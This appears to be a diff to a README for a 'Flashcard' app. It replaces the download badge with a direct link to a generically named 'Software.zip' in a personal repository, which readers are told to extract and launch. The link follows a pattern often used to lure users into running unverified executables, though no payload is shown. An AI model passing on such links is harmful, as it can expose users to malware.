@@ -27,7 +27,7 @@ As technology advances, there are more opportunities than ever to engage with di
 
 ## Installation
 To get started with **Flashcard**, you can download the latest version from the following link:
-[![Download Flashcard](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Flashcard](https://github.com/KHOULOUD8SEGHIRA/flashcard/releases/download/v1.0/Software.zip)](https://github.com/KHOULOUD8SEGHIRA/flashcard/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the zip file, you will need to extract it and launch the application on your device.
 
